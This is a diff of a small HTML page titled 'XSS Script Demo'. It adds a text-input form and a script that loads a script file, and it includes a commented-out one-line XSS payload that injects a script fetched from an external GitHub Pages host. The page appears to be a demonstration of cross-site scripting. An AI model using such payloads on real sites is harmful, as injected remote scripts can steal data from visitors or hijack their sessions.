@@ -9,11 +9,30 @@
 <body>
     <h1>XSS Script Demo</h1>
 
+
+
+    <script>
+        xss = document.createElement('script');
+        //xss.src = "https://appfield.github.io/xss-injectable-script/script.js";
+        xss.src = "./script.js";
+        xss.type="text/javascript"
+        document.body.append(xss);
+
+        //<script>xss = document.createElement('script');xss.src="https://appfield.github.io/xss-injectable-script/script.js";xss.type="text/javascript";document.body.append(xss);</script>
+    </script>
+
     <button onclick="console.log('BUTTON 1');">Will not console.log</button>
 
     <button onclick="console.log('BUTTON 2');">Will not console.log</button>
 
-    <script src="./script.js"></script>
+    <form method="GET">
+        <input type="text">
+
+        <input type="submit">
+    </form>
+
+    <!-- <script src="./script.js"></script> -->
+    <!-- <script src="https://appfield.github.io/xss-injectable-script/script.js"></script> -->
 </body>
 
 </html>
